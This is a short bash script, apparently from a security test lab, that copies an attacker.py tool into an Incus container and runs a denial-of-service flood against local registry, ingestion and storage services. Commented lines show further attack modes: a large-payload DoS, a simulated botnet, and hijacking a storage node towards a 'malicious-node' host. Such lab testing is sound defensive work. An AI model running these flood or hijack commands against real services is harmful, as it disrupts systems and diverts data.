#!/usr/bin/env bash
source "$(dirname "$0")/lib.sh"
sleep 10   # tempo para os serviços se registarem

incus file push "$ROOT/ADTree/attacker.py" attacker-pt-aveiro-dc1-r99-n99/root/attacker.py
incus exec attacker-pt-aveiro-dc1-r99-n99 -- env \
  REGISTRY_URL="http://registry-pt-aveiro-dc1-r01-n01.incus:5050" \
  INGESTION_URL="http://ingestion-pt-aveiro-dc1-r01-n02.incus:5001" \
  STORAGE_URL="http://storage-pt-aveiro-dc1-r02-n01.incus:5002" \
  python3 /root/attacker.py dos-flood --requests 200 --concurrency 20

# python3 /root/attacker.py dos-payload --payload-size 500000
# python3 /root/attacker.py botnet --sensors 10 --requests-per-sensor 5
# python3 /root/attacker.py hijack --storage-id storage-pt-aveiro-dc1-r02-n01 --malicious-url http://malicious-node.incus:6666